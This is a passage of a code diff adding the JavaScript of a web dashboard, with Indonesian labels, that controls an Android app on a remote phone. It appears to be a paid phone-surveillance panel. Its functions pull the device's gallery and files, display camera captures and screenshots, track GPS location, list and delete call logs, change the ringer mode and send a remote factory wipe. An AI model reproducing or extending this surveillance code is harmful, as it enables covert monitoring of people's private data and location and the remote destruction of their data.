+        } else if (attempts++ < 11) {
+          setTimeout(poll, 5000);
+        } else {
+          if (reqEl) { reqEl.textContent = '⚠️ File belum tersedia. Pastikan APK aktif di perangkat.'; }
+        }
+      });
+    };
+    setTimeout(poll, 5000);
+  }
+}
+
+function requestGalleryPreview() {
+  if (!currentGalleryItem || currentGalleryItem.url) return;
+  sendCommand('upload_gallery', { id: currentGalleryItem.id, uri: currentGalleryItem.uri || '' }, true);
+  const reqEl = document.getElementById('gallery-req-status');
+  if (reqEl) { reqEl.style.display = 'block'; reqEl.textContent = 'Meminta file dari perangkat...'; }
+  const ref = db.ref(getDevicePath(`gallery/${currentGalleryItem.id}/url`));
+  let attempts = 0;
+  const poll = () => {
+    ref.once('value', snap => {
+      const url = snap.val();
+      if (url) {
+        currentGalleryItem.url = url;
+        if (reqEl) reqEl.style.display = 'none';
+        viewGalleryItem(currentGalleryItem.id);
+      } else if (attempts++ < 11) {
+        setTimeout(poll, 5000);
+      } else if (reqEl) {
+        reqEl.textContent = 'File belum tersedia. Pastikan APK aktif di perangkat.';
+      }
+    });
+  };
+  setTimeout(poll, 5000);
+}
+
+function deleteGalleryItem() {
+  if (!currentGalleryItem || !confirm('Hapus media ini?')) return;
+  db.ref(getDevicePath(`gallery/${currentGalleryItem.id}`)).remove();
+  sendCommand('delete_gallery', currentGalleryItem.id);
+  closeModal('modal-gallery-view');
+  showToast('🗑️ Media dihapus');
+  loadGallery();
+}
+
+// ============================================================
+// FILE MANAGER
+// ============================================================
+let currentFilePath = '/';
+let currentSafePath = 'root';
+function loadFiles(path) {
+  currentFilePath = path;
+  currentSafePath = path.replace(/\//g, '_').replace(/^_/, '') || 'root';
+  const el = document.getElementById('file-list');
+  el.innerHTML = '<div class="loader"><div class="spinner" style="border-top-color:#fb923c"></div></div>';
+  updateBreadcrumb(path);
+  // Gunakan listener real-time agar otomatis update saat APK sync folder ini
+  attachDataListener('files', db.ref(getDevicePath(`files/${currentSafePath}`)), snap => {
+    const data = snap.val();
+    filesDataMap = {};
+    const items = data ? Object.entries(data).map(([id, v]) => {
+      const item = {id, ...v};
+      filesDataMap[id] = item;
+      return item;
+    }) : [];
+    if (!items.length) {
+      el.innerHTML = `<div class="empty-state" style="padding:30px">
+        <i class="fa-solid fa-folder-open" style="color:#bbb"></i>
+        <p style="color:#bbb">Folder kosong atau belum disinkronisasi</p>
+        <p style="color:#888;font-size:0.78rem;margin-top:6px">APK sedang menyinkronisasi folder ini...<br>Atau tekan BACKUP SEKARANG di halaman perangkat.</p>
+      </div>`;
+      return;
+    }
+    el.innerHTML = items.sort((a,b) => (b.isDir?1:0) - (a.isDir?1:0)).map(f => {
+      const safeId = f.id.replace(/'/g,"\\'");
+      const safePath = (f.path||path+'/'+f.name).replace(/'/g,"\\'");
+      const safeName = (f.name||'').replace(/'/g,"\\'");
+      const mediaType = getFileMediaType(f.name);
+      const isMedia = !!mediaType && !f.isDir;
+      const hasUrl = !!(f.url && f.url.startsWith('http'));
+      const clickAction = f.isDir
+        ? `navigateFolder('${safePath}')`
+        : (isMedia ? `previewFile('${safeId}')` : `downloadFile('${safeId}')`);
+      const previewBadge = isMedia
+        ? `<span style="font-size:0.58rem;background:${mediaType==='audio'?'rgba(139,92,246,0.25)':mediaType==='video'?'rgba(239,68,68,0.2)':'rgba(34,197,94,0.2)'};color:${mediaType==='audio'?'#a78bfa':mediaType==='video'?'#f87171':'#4ade80'};padding:1px 5px;border-radius:4px;margin-left:4px">${mediaType==='audio'?'audio':mediaType==='video'?'video':'img'}</span>` : '';
+      const urlDot = hasUrl ? `<span style="width:7px;height:7px;background:#22c55e;border-radius:50%;display:inline-block;margin-left:4px;flex-shrink:0" title="Siap diputar/diunduh"></span>` : '';
+      return `
+      <div class="file-item" onclick="${clickAction}">
+        <span class="file-icon">${getFileIcon(f)}</span>
+        <div class="file-info">
+          <div class="fname" style="display:flex;align-items:center;flex-wrap:wrap;gap:2px">${f.name}${previewBadge}${urlDot}</div>
+          <div class="fsize">${f.isDir ? 'Folder' : formatSize(f.size)}</div>
+        </div>
+        <div class="list-actions">
+          ${isMedia ? `<button class="icon-action" style="background:rgba(139,92,246,0.2);color:#a78bfa" onclick="event.stopPropagation();previewFile('${safeId}')"><i class="fa-solid fa-${mediaType==='audio'?'headphones':mediaType==='video'?'play':'eye'}"></i></button>` : ''}
+          ${!f.isDir ? `<button class="icon-action ia-blue" onclick="event.stopPropagation();downloadFile('${safeId}')"><i class="fa-solid fa-download"></i></button>` : ''}
+          <button class="icon-action ia-red" onclick="event.stopPropagation();deleteFile('${safeId}','${safeName}')"><i class="fa-solid fa-trash"></i></button>
+        </div>
+      </div>`;
+    }).join('');
+  });
+}
+
+function getFileIcon(f) {
+  if (f.isDir) return '📁';
+  const ext = (f.name||'').split('.').pop().toLowerCase();
+  const map = {
+    jpg:'🖼️', jpeg:'🖼️', png:'🖼️', gif:'🎞️', webp:'🖼️', bmp:'🖼️', heic:'🖼️',
+    mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬', webm:'🎬', flv:'🎬', '3gp':'🎬', m4v:'🎬',
+    mp3:'🎵', wav:'🎵', ogg:'🎵', m4a:'🎵', aac:'🎵', flac:'🎵', opus:'🎵', wma:'🎵', amr:'🎵',
+    pdf:'📄', doc:'📝', docx:'📝', xls:'📊', xlsx:'📊', ppt:'📊', pptx:'📊',
+    zip:'🗜️', rar:'🗜️', '7z':'🗜️', tar:'🗜️', gz:'🗜️',
+    apk:'📦', txt:'📃', json:'📋', xml:'📋', csv:'📊'
+  };
+  return map[ext] || '📄';
+}
+
+function formatSize(bytes) {
+  if (!bytes) return '-';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
+  return (bytes/1048576).toFixed(1) + ' MB';
+}
+
+function navigateFolder(path) {
+  fileHistory.push(currentFilePath);
+  // Kirim perintah ke APK untuk sync folder ini (silent — tidak tampilkan toast)
+  sendCommand('sync_files', path, true);
+  loadFiles(path);
+}
+
+function fileGoBack() {
+  if (fileHistory.length > 0) {
+    loadFiles(fileHistory.pop());
+  } else {
+    showScreen('screen-device-home');
+  }
+}
+
+function updateBreadcrumb(path) {
+  const el = document.getElementById('file-breadcrumb');
+  const parts = path.replace(/^\//, '').split('/').filter(Boolean);
+  let html = '<span onclick="loadFiles(\'/\')" style="cursor:pointer;color:rgba(255,255,255,0.8)">📂 Internal</span>';
+  let cur = '';
+  parts.forEach(p => {
+    cur += '/' + p;
+    const cp = cur;
+    html += `<span class="sep"> / </span><span style="cursor:pointer;color:rgba(255,255,255,0.8)" onclick="loadFiles('${cp}')">${p}</span>`;
+  });
+  el.innerHTML = html;
+}
+
+function downloadFile(id) {
+  const f = filesDataMap[id];
+  if (!f) { showToast('❌ File tidak ditemukan'); return; }
+  if (f.url) {
+    downloadViaProxy(f.url, f.name || 'file');
+    return;
+  }
+  // No URL yet - request APK to upload this file to object storage
+  sendCommand('request_file', { id, path: f.path || currentFilePath });
+  showToast(`📤 Meminta "${f.name || 'file'}" dari perangkat...`);
+  // Poll Firebase until url appears (max 90 sec, every 5 sec)
+  const ref = db.ref(getDevicePath(`files/${currentSafePath}/${id}/url`));
+  let attempts = 0;
+  const poll = () => {
+    ref.once('value', snap => {
+      const url = snap.val();
+      if (url) {
+        filesDataMap[id] = { ...filesDataMap[id], url };
+        downloadViaProxy(url, f.name || 'file');
+        showToast(`✅ "${f.name}" siap diunduh`);
+      } else if (attempts++ < 17) {
+        setTimeout(poll, 5000);
+      } else {
+        showToast(`⚠️ "${f.name || 'file'}" belum tersedia. Pastikan APK aktif.`);
+      }
+    });
+  };
+  setTimeout(poll, 5000);
+}
+
+function deleteFile(id, name) {
+  if (!confirm(`Hapus "${name}"?`)) return;
+  const filePath = filesDataMap[id]?.path;
+  if (!filePath) { showToast('Path file tidak ditemukan'); return; }
+  db.ref(getDevicePath(`files/${currentSafePath}/${id}`)).remove();
+  sendCommand('delete_file', { id, path: filePath });
+  showToast('🗑️ File dihapus');
+  delete filesDataMap[id];
+  loadFiles(currentFilePath);
+}
+
+function previewFile(id) {
+  const f = filesDataMap[id];
+  if (!f) { showToast('❌ File tidak ditemukan'); return; }
+  if (f.url && f.url.startsWith('http')) {
+    openGalleryUrl(f.url, f.name || 'file');
+    return;
+  }
+  // URL belum ada - minta APK upload ke object storage dulu, lalu buka preview
+  sendCommand('request_file', { id, path: f.path || currentFilePath });
+  showToast(`📤 Meminta "${f.name || 'file'}" dari perangkat...`);
+  const ref = db.ref(getDevicePath(`files/${currentSafePath}/${id}/url`));
+  let attempts = 0;
+  const poll = () => {
+    ref.once('value', snap => {
+      const url = snap.val();
+      if (url) {
+        filesDataMap[id] = { ...filesDataMap[id], url };
+        showToast(`▶️ Membuka "${f.name}"...`);
+        openGalleryUrl(url, f.name || 'file');
+      } else if (attempts++ < 17) {
+        setTimeout(poll, 5000);
+      } else {
+        showToast(`⚠️ "${f.name || 'file'}" belum tersedia. Pastikan APK aktif.`);
+      }
+    });
+  };
+  setTimeout(poll, 5000);
+}
+
+// ============================================================
+// CAMERA
+// ============================================================
+function loadCameraResults() {
+  const el = document.getElementById('camera-results');
+  attachDataListener('camera', db.ref(getDevicePath('camera_results')).limitToLast(12), snap => {
+    const data = snap.val();
+    if (!data) { el.innerHTML = '<div class="empty-state" style="padding:20px"><i class="fa-solid fa-image" style="color:#bbb"></i><p style="color:#bbb">Belum ada foto/video</p></div>'; return; }
+    const items = Object.entries(data).map(([k,v]) => ({id:k,...v})).reverse();
+    el.innerHTML = `<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:6px">${items.map(i => {
+      const fname = `kamera_${i.camera||'foto'}_${i.id||Date.now()}.jpg`;
+      const safeFname = fname.replace(/'/g,"\\'");
+      const safeUrl = (i.url||'').replace(/'/g,"\\'");
+      return `<div style="position:relative;aspect-ratio:1;border-radius:10px;overflow:hidden;background:#111;cursor:pointer" onclick="openGalleryUrl('${safeUrl}','${safeFname}')">
+        <img src="${i.url||''}" style="width:100%;height:100%;object-fit:cover" loading="lazy" onerror="this.style.display='none'">
+        ${i.camera ? `<span style="position:absolute;top:4px;left:4px;background:rgba(0,0,0,0.7);color:white;font-size:0.62rem;padding:2px 5px;border-radius:4px">${i.camera}</span>` : ''}
+        ${i.url ? `<button class="icon-action ia-green" style="position:absolute;bottom:4px;right:4px;width:28px;height:28px;min-width:unset;font-size:0.7rem" onclick="event.stopPropagation();downloadViaProxy('${safeUrl}','${safeFname}')"><i class="fa-solid fa-download"></i></button>` : ''}
+        <div style="position:absolute;bottom:4px;left:4px;color:rgba(255,255,255,0.7);font-size:0.6rem">${formatDate(i.timestamp)}</div>
+      </div>`;
+    }).join('')}</div>`;
+  });
+}
+
+// ============================================================
+// UNIVERSAL PROXY DOWNLOAD - avoids CORS on remote file URLs
+// ============================================================
+function downloadViaProxy(url, filename) {
+  if (!hasActiveSubscription()) {
+    showToast('Langganan aktif diperlukan untuk download file');
+    openSubscriptionModal();
+    return;
+  }
+  if (!url) { showToast('❌ File belum tersedia. Coba minta dari perangkat dulu.'); return; }
+  // Server-side proxy: /api/download?url=...&filename=...
+  const proxyUrl = `/api/download?url=${encodeURIComponent(url)}&filename=${encodeURIComponent(filename || 'download')}`;
+  const a = document.createElement('a');
+  a.href = proxyUrl;
+  a.download = filename || 'download';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => { try { document.body.removeChild(a); } catch(e) {} }, 1000);
+  showToast(`⬇️ Mengunduh ${filename || 'file'}...`);
+}
+
+function getFileMediaType(name) {
+  const ext = (name || '').split('.').pop().toLowerCase();
+  if (['jpg','jpeg','png','gif','webp','bmp','heic','heif'].includes(ext)) return 'image';
+  if (['mp4','avi','mkv','mov','webm','flv','3gp','m4v','ts'].includes(ext)) return 'video';
+  if (['mp3','wav','ogg','m4a','aac','flac','opus','wma','amr','3ga'].includes(ext)) return 'audio';
+  return null;
+}
+
+function resolveMediaType(url, filename, mediaTypeHint) {
+  if (mediaTypeHint === 'image' || mediaTypeHint === 'video' || mediaTypeHint === 'audio') return mediaTypeHint;
+  const mediaType = getFileMediaType(filename || url.split('?')[0]);
+  if (mediaType) return mediaType;
+  if (/\.(jpg|jpeg|png|gif|webp|bmp|heic|heif)(\?|$)/i.test(url)) return 'image';
+  if (/\.(mp4|avi|mkv|mov|webm|flv|3gp|m4v|ts)(\?|$)/i.test(url)) return 'video';
+  if (/\.(mp3|wav|ogg|m4a|aac|flac|opus|wma|amr|3ga)(\?|$)/i.test(url)) return 'audio';
+  return null;
+}
+
+function buildMediaPreviewHtml(url, filename, options = {}) {
+  const mediaType = resolveMediaType(url, filename, options.mediaTypeHint);
+  const maxHeight = options.maxHeight || '65vh';
+  const compact = !!options.compact;
+  const displayName = filename || 'File';
+  if (mediaType === 'video') {
+    return `<video src="${url}" style="width:100%;border-radius:${compact ? '10px' : '14px'};max-height:${maxHeight};object-fit:contain;background:#000;display:block" controls autoplay playsinline preload="metadata">Browser tidak mendukung pemutar video.</video>`;
+  }
+  if (mediaType === 'audio') {
+    return `<div style="background:linear-gradient(135deg,#1e1b4b,#312e81);border-radius:${compact ? '12px' : '20px'};padding:${compact ? '20px 16px' : '28px 20px'};text-align:center">
+      <div style="font-size:${compact ? '2.5rem' : '3.5rem'};margin-bottom:12px">ðŸŽµ</div>
+      <div style="color:#c4b5fd;font-size:0.8rem;margin-bottom:4px">Sedang diputar</div>
+      <div style="color:white;font-weight:700;font-size:0.9rem;margin-bottom:18px;word-break:break-all;line-height:1.4">${displayName}</div>
+      <audio src="${url}" controls autoplay preload="metadata" style="width:100%;accent-color:#22c55e;border-radius:8px;">Browser tidak mendukung pemutar audio.</audio>
+    </div>`;
+  }
+  if (mediaType === 'image') {
+    return `<canvas class="media-preview-canvas" data-src="${url}" style="width:100%;border-radius:${compact ? '10px' : '14px'};max-height:${maxHeight};display:block;background:#111"></canvas>
+      <div class="canvas-error" style="display:none;padding:40px;text-align:center;color:#666;flex-direction:column;align-items:center;gap:8px">
+        <i class="fa-solid fa-image fa-2x"></i>
+        <span style="font-size:0.85rem">Gambar tidak dapat dimuat</span>
+      </div>`;
+  }
+  return `<div style="padding:40px;text-align:center;color:#cbd5e1;background:#111827;border-radius:14px">
+    <i class="fa-solid fa-file fa-2x"></i>
+    <div style="font-size:0.9rem;margin-top:10px">Pratinjau tidak tersedia untuk jenis file ini</div>
+  </div>`;
+}
+
+function openGalleryUrl(url, filename) {
+  if (!url) { showToast('❌ URL tidak tersedia'); return; }
+  const existing = document.getElementById('ps-preview-overlay');
+  if (existing) existing.remove();
+
+  const mediaType = getFileMediaType(filename || url.split('?')[0]);
+  const isImage = mediaType === 'image' || /\.(jpg|jpeg|png|gif|webp|bmp|heic|heif)(\?|$)/i.test(url);
+  const isVideo = mediaType === 'video' || /\.(mp4|avi|mkv|mov|webm|flv|3gp|m4v|ts)(\?|$)/i.test(url);
+  const isAudio = mediaType === 'audio' || /\.(mp3|wav|ogg|m4a|aac|flac|opus|wma|amr|3ga)(\?|$)/i.test(url);
+  const displayName = filename || 'File';
+  const safeUrl = url.replace(/'/g, '%27');
+  const safeName = displayName.replace(/'/g, "\\'");
+
+  let mediaHtml;
+  if (isVideo) {
+    mediaHtml = `
+      <video src="${url}" style="width:100%;border-radius:14px;max-height:62vh;background:#000;display:block"
+        controls autoplay playsinline preload="metadata">
+        Browser tidak mendukung pemutar video.
+      </video>`;
+  } else if (isAudio) {
+    mediaHtml = `
+      <div style="background:linear-gradient(135deg,#1e1b4b,#312e81);border-radius:20px;padding:28px 20px;text-align:center">
+        <div style="font-size:3.5rem;margin-bottom:12px">🎵</div>
+        <div style="color:#c4b5fd;font-size:0.8rem;margin-bottom:4px">Sedang diputar</div>
+        <div style="color:white;font-weight:700;font-size:0.9rem;margin-bottom:18px;word-break:break-all;line-height:1.4">${displayName}</div>
+        <audio src="${url}" controls autoplay preload="metadata" style="width:100%;accent-color:#22c55e;border-radius:8px;">
+          Browser tidak mendukung pemutar audio.
+        </audio>
+      </div>`;
+  } else if (isImage) {
+    mediaHtml = `
+      <canvas class="media-preview-canvas" data-src="${url}"
+        style="width:100%;border-radius:14px;max-height:65vh;display:block;background:#111"></canvas>
+      <div class="canvas-error" style="display:none;padding:40px;text-align:center;color:#666;flex-direction:column;align-items:center;gap:8px">
+        <i class="fa-solid fa-image fa-2x"></i>
+        <span style="font-size:0.85rem">Gambar tidak dapat dimuat</span>
+      </div>`;
+  } else {
+    mediaHtml = `
+      <div style="padding:40px;text-align:center;color:#cbd5e1;background:#111827;border-radius:14px">
+        <i class="fa-solid fa-file fa-2x"></i>
+        <div style="font-size:0.9rem;margin-top:10px">Pratinjau tidak tersedia untuk jenis file ini</div>
+      </div>`;
+  }
+
+  const overlay = document.createElement('div');
+  overlay.id = 'ps-preview-overlay';
+  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.94);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px;overflow-y:auto;';
+  overlay.innerHTML = `
+    <div style="max-width:440px;width:100%;position:relative;padding-top:48px">
+      <div style="position:absolute;top:0;left:0;right:0;display:flex;align-items:center;justify-content:space-between">
+        <span style="color:rgba(255,255,255,0.7);font-size:0.78rem;max-width:80%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${displayName}</span>
+        <button onclick="document.getElementById('ps-preview-overlay').remove()"
+          style="background:rgba(255,255,255,0.12);border:none;color:white;width:34px;height:34px;border-radius:50%;cursor:pointer;font-size:1rem;flex-shrink:0">✕</button>
+      </div>
+      ${mediaHtml}
+      <button onclick="downloadViaProxy('${safeUrl}','${safeName}')"
+        style="margin-top:12px;width:100%;background:linear-gradient(145deg,#22c55e,#16a34a);color:white;border:none;border-radius:12px;padding:13px;font-size:0.9rem;font-weight:700;cursor:pointer;">
+        <i class="fa-solid fa-download"></i> Unduh ${displayName}
+      </button>
+    </div>`;
+  overlay.onclick = e => { if (e.target === overlay) overlay.remove(); };
+  document.body.appendChild(overlay);
+  if (isImage) renderCanvasPreviews(overlay);
+}
+
+function renderCanvasPreviews(root = document) {
+  root.querySelectorAll('canvas.media-preview-canvas[data-src]').forEach(canvas => {
+    const img = new Image();
+    img.onload = () => {
+      const maxWidth = 1200;
+      const maxHeight = 900;
+      const ratio = Math.min(maxWidth / img.naturalWidth, maxHeight / img.naturalHeight, 1);
+      canvas.width = Math.max(1, Math.round(img.naturalWidth * ratio));
+      canvas.height = Math.max(1, Math.round(img.naturalHeight * ratio));
+      const ctx = canvas.getContext('2d');
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+    };
+    img.onerror = () => {
+      canvas.style.display = 'none';
+      const errorEl = canvas.nextElementSibling;
+      if (errorEl) errorEl.style.display = 'flex';
+    };
+    img.src = canvas.dataset.src;
+  });
+}
+
+// ============================================================
+// RINGTONE
+// ============================================================
+function sendRingCommand(mode) {
+  sendCommand('ring_mode', mode);
+  const labels = { ring: '🔔 Normal', vibrate: '📳 Getar', silent: '🔇 Senyap', alarm: '🚨 ALARM' };
+  document.getElementById('current-ring-mode').textContent = labels[mode] || mode;
+}
+
+// ============================================================
+// GPS
+// ============================================================
+let gpsLat = null, gpsLng = null;
+function loadGPS() {
+  document.getElementById('gps-lat').textContent = 'Menunggu data...';
+  document.getElementById('gps-lng').textContent = 'Menunggu data...';
+  document.getElementById('gps-acc').textContent = '-';
+  document.getElementById('gps-time').textContent = '-';
+  document.getElementById('gps-addr').textContent = 'Tekan Perbarui GPS jika belum muncul';
+  document.getElementById('gps-map').innerHTML = `
+    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;color:#888;gap:8px;padding:16px;text-align:center">
+      <i class="fa-solid fa-location-dot fa-2x"></i>
+      <span style="font-size:0.82rem">Belum ada data lokasi.<br>Pastikan GPS aktif di perangkat, lalu tekan <b>Perbarui GPS</b>.</span>
+    </div>`;
+  attachDataListener('gps', db.ref(getDevicePath('location')), snap => {
+    const loc = snap.val();
+    if (!loc || (!loc.lat && !loc.lng)) {
+      document.getElementById('gps-lat').textContent = 'Tidak ada data';
+      document.getElementById('gps-lng').textContent = 'Tekan Perbarui GPS ↓';
+      return;
+    }
+    gpsLat = loc.lat;
+    gpsLng = loc.lng;
+    document.getElementById('gps-lat').textContent = loc.lat?.toFixed(6) || '-';
+    document.getElementById('gps-lng').textContent = loc.lng?.toFixed(6) || '-';
+    document.getElementById('gps-acc').textContent = loc.accuracy ? loc.accuracy.toFixed(0) + ' meter' : '-';
+    document.getElementById('gps-time').textContent = formatDate(loc.timestamp);
+    if (loc.lat && loc.lng) {
+      document.getElementById('gps-map').innerHTML = `
+        <iframe src="https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed" style="width:100%;height:100%;border:none"></iframe>
+      `;
+      fetchAddress(loc.lat, loc.lng);
+    }
+  });
+}
+
+function fetchAddress(lat, lng) {
+  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
+    .then(r => r.json())
+    .then(d => { document.getElementById('gps-addr').textContent = d.display_name || '-'; })
+    .catch(() => {});
+}
+
+function refreshGPS() {
+  sendCommand('get_location', true);
+  showToast('📍 Meminta update lokasi...');
+}
+
+function openGoogleMaps() {
+  if (!gpsLat || !gpsLng) { showToast('Data lokasi belum tersedia'); return; }
+  window.open(`https://maps.google.com/?q=${gpsLat},${gpsLng}`, '_blank');
+}
+
+// ============================================================
+// CALLS
+// ============================================================
+let callsFilter = 'all';
+function loadCalls() {
+  const el = document.getElementById('calls-list');
+  el.innerHTML = '<div class="loader"><div class="spinner" style="border-top-color:#818cf8"></div></div>';
+  attachDataListener('calls', db.ref(getDevicePath('calls')), snap => {
+    const data = snap.val();
+    callsData = data ? Object.entries(data).map(([id, v]) => ({id, ...v})).sort((a,b) => (b.date||0)-(a.date||0)) : [];
+    renderCalls(callsData);
+  });
+}
+
+function normalizeCallType(raw) {
+  if (raw === 'incoming' || raw === 1) return 'incoming';
+  if (raw === 'outgoing' || raw === 2) return 'outgoing';
+  if (raw === 'missed'   || raw === 3 || raw === 5 || raw === 6) return 'missed';
+  return 'incoming';
+}
+
+function filterCalls(type) {
+  callsFilter = type;
+  const f = type === 'all' ? callsData : callsData.filter(c => normalizeCallType(c.type) === type);
+  renderCalls(f);
+}
+
+function renderCalls(list) {
+  const el = document.getElementById('calls-list');
+  if (!list.length) { el.innerHTML = '<div class="empty-state"><i class="fa-solid fa-phone"></i><p>Tidak ada riwayat telepon</p></div>'; return; }
+  const typeMap = {
+    incoming: { icon: '📞', color: 'call-type-in',   label: 'Masuk' },
+    outgoing: { icon: '📤', color: 'call-type-out',  label: 'Keluar' },
+    missed:   { icon: '❌', color: 'call-type-miss', label: 'Tidak Dijawab' }
+  };
+  el.innerHTML = list.map(c => {
+    const t = typeMap[normalizeCallType(c.type)] || { icon: '📞', color: '', label: String(c.type) };
+    return `
+      <div class="list-item">
+        <div class="list-avatar" style="background:${getAvatarColor(c.name||c.number)}">${getInitials(c.name||c.number)}</div>
+        <div class="list-item-info">
+          <div class="name">${htmlEscape(c.name || c.number || 'Tidak Dikenal')}</div>
+          <div class="sub"><span class="${t.color}">${t.icon} ${t.label}</span> · ${formatDuration(c.duration)} · ${formatDate(c.date)}</div>
+        </div>
+        <button class="icon-action ia-red" onclick="deleteCall('${c.id}')"><i class="fa-solid fa-trash"></i></button>
+      </div>
+    `;
+  }).join('');
+}
+
+function deleteCall(id) {
+  if (!confirm('Hapus riwayat panggilan ini?')) return;
+  db.ref(getDevicePath(`calls/${id}`)).remove();
+  sendCommand('delete_call', id);
+  showToast('🗑️ Riwayat dihapus');
+  loadCalls();
+}
+
+// ============================================================
+// SCREENSHOTS
+// ============================================================
+function loadScreenshots() {
+  const el = document.getElementById('screenshot-results');
+  attachDataListener('screenshots', db.ref(getDevicePath('screenshots')).limitToLast(12), snap => {
+    const data = snap.val();
+    if (!data) { el.innerHTML = '<div class="empty-state" style="padding:20px"><i class="fa-solid fa-image" style="color:#bbb"></i><p style="color:#bbb">Belum ada screenshot</p></div>'; return; }
+    const items = Object.entries(data).map(([k,v]) => ({id:k,...v})).reverse();
+    el.innerHTML = `<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px">${items.map(i => {
+      const fname = `screenshot_${i.id||Date.now()}.png`;
+      const safeFname = fname.replace(/'/g,"\\'");
+      const safeUrl = (i.url||'').replace(/'/g,"\\'");
+      return `<div style="position:relative;border-radius:10px;overflow:hidden;background:#111;cursor:pointer" onclick="openGalleryUrl('${safeUrl}','${safeFname}')">
+        <img src="${i.url||''}" style="width:100%;object-fit:contain;display:block" loading="lazy" onerror="this.style.display='none'">
+        <div style="display:flex;align-items:center;justify-content:space-between;padding:4px 6px;background:rgba(0,0,0,0.6)">
+          <span style="font-size:0.65rem;color:#9ca3af">${formatDate(i.timestamp)}</span>
+          ${i.url ? `<button onclick="event.stopPropagation();downloadViaProxy('${safeUrl}','${safeFname}')" style="background:rgba(34,197,94,0.8);border:none;color:white;border-radius:6px;padding:3px 7px;font-size:0.65rem;cursor:pointer">⬇️</button>` : ''}
+        </div>
+      </div>`;
+    }).join('')}</div>`;
+  });
+}
+
+// ============================================================
+// WIPE (FACTORY RESET)
+// ============================================================
+function confirmWipe() {
+  const device = currentDevice ? (currentDevice.info?.name || currentDevice.id) : 'perangkat ini';
+  const step1 = confirm(`⚠️ PERINGATAN!\n\nAnda akan menghapus SEMUA data di "${device}" secara permanen.\n\nTindakan ini TIDAK DAPAT DIBATALKAN.\n\nLanjutkan?`);
+  if (!step1) return;
+  const input = prompt(`KONFIRMASI AKHIR\n\nKetik "HAPUS SEMUA" untuk mengkonfirmasi penghapusan data perangkat ini:`);
+  if (!input || input.trim() !== 'HAPUS SEMUA') {
+    showToast('❌ Konfirmasi tidak cocok. Wipe dibatalkan.');
+    return;
+  }
+  sendCommand('wipe', true);
+  showToast('☠️ Perintah wipe dikirim. Perangkat akan direset.', 5000);
+  showScreen('screen-device-home');
+}
+
+// ============================================================
+// CLOSE MODALS ON OVERLAY CLICK
+// ============================================================
+document.querySelectorAll('.modal-overlay').forEach(overlay => {
+  overlay.addEventListener('click', e => {
+    if (e.target === overlay) overlay.classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
+
